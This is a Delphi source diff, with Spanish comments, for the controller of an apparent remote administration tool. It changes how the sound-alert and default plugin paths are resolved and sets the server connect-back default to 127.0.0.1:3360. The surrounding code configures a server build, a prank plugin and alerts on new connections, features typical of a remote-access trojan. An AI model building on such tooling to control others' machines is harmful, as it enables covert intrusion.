@@ -382,6 +382,7 @@ var
   SHP: HWND;
   TmpServDLL: string;
   Fmt: TFormatSettings;
+  SoundNotification: string;
 
 begin
   try
@@ -523,12 +524,18 @@ begin
       if Formopciones.CheckBoxNotificacionMsn.Checked and not DesactivarNotificaciones then
         SendMessage(FormMain.Handle, WM_POP_MESSAGE, Integer(Item), 0);
 
-      if FormOpciones.CheckBoxAlertaSonora.Checked and not DesactivarNotificaciones then //Alerta sonora
-        if fileexists(Formopciones.EditRutaArchivoWav.Text) then
-          begin
-            sndPlaySound(nil, 0); //Paramos el anterior si está sonando
-            sndPlaySound(PChar(Formopciones.EditRutaArchivoWav.Text), SND_NODEFAULT or SND_ASYNC);
-          end;
+      //Alerta sonora
+      if FormOpciones.CheckBoxAlertaSonora.Checked and not DesactivarNotificaciones then
+      begin
+        SoundNotification := Formopciones.EditRutaArchivoWav.Text;
+        SoundNotification := StringReplace(SoundNotification, '%cooldir%', extractfiledir(ParamStr(0)), [rfReplaceAll, rfIgnoreCase]);
+        if fileexists(SoundNotification) then
+        begin
+          sndPlaySound(nil, 0); //Paramos el anterior si está sonando
+          sndPlaySound(PChar(SoundNotification), SND_NODEFAULT or SND_ASYNC);
+        end;
+      end;
+
       //Mandamos el evento de nueva conexion
       SendMessage(FormMain.Handle, WM_EVENT_MESSAGE, 0 {0=nueva conexión}, Integer(Item));
     end
@@ -686,7 +693,10 @@ begin
     with FormOpciones do
       begin
        {Los plugins predeterminados}
-        Plugins := Ini.ReadString('Opciones', 'Plugins', ExtractFilePath(ParamStr(0))+'Recursos\Plugins\Mensajes\MensajesC.dll'+'|'+ExtractFilePath(ParamStr(0))+'Recursos\Plugins\Bromas\BromasC.dll'+'|');
+        Plugins := Ini.ReadString('Opciones', 'Plugins',
+                    '%CoolDir%\Recursos\Plugins\Bromas\BromasC.dll' + '|' +
+                    '%CoolDir%\Recursos\Plugins\InstalledApplications\InstalledApplicationsC.dll' + '|' +
+                    '%CoolDir%\Recursos\Plugins\Mensajes\MensajesC.dll' + '|');
         EditPuerto.Text :=
           Ini.ReadString('Opciones', 'PuertoEscucha', '3360;77');
         CheckBoxPreguntarAlSalir.Checked :=
@@ -714,7 +724,7 @@ begin
         CheckBoxAlertaSonora.Checked :=
           Ini.ReadBool('Opciones', 'AlertaSonora', True);
         EditRutaArchivoWav.Text :=
-          Ini.ReadString('Opciones', 'AlertaSonoraPath', Extractfilepath(ParamStr(0)) + 'Recursos\Sonidos\default.wav');
+          Ini.ReadString('Opciones', 'AlertaSonoraPath', '%CoolDir%\Recursos\Sonidos\default.wav');
         CheckBoxCCIndependiente.Checked :=
           Ini.ReadBool('Opciones', 'CControlIndependiente', False);
         LabeledEditDirUser.Text := Ini.ReadString('Opciones', 'PathUsuario', '%CoolDir%\Usuarios\%Identificator%\');
@@ -733,20 +743,22 @@ begin
         CheckBoxSplash.Checked := Ini.ReadBool('Opciones', 'Splash', True);
       end;
 
-      Tempstr := FormOpciones.Plugins;   //añadimos los plugins al listview
+      //añadimos los plugins al listview
+      Tempstr := FormOpciones.Plugins;
       FormOpciones.Plugins := '';
       while (pos('|', TempStr) > 0) do
       begin
-          FormOpciones.Pluginadd(Copy(TempStr, 1, Pos('|', TempStr) - 1));
-          Delete(TempStr, 1, Pos('|', TempStr));
+        FormOpciones.Pluginadd(Copy(TempStr, 1, Pos('|', TempStr) - 1));
+        Delete(TempStr, 1, Pos('|', TempStr));
       end;
+
     //Valores de la Form de Configuracion del server
     with FormConfigServer do
       begin
         EditID.Text :=
           Ini.ReadString('ConfigurarServidor', 'ID', 'CoolID');
         IPsyPuertos :=
-          Ini.ReadString('ConfigurarServidor', 'Conectar', '127.0.0.1:80¬');
+          Ini.ReadString('ConfigurarServidor', 'Conectar', '127.0.0.1:3360¬');
         EditPluginName.Text :=
           Ini.ReadString('ConfigurarServidor', 'NombrePlugin', '0k3n.dat');
         CheckBoxCopiar.Checked :=
